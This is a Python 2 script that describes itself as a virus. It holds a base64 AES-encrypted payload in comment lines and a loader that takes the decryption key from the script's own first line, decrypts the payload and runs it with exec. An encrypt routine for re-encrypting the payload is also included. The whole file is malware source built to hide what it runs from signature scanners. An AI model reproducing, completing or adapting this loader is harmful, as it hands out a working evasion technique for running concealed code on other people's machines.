print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
print "bohohoo"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   return base64.b64encode(encrypted)
 ####################

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload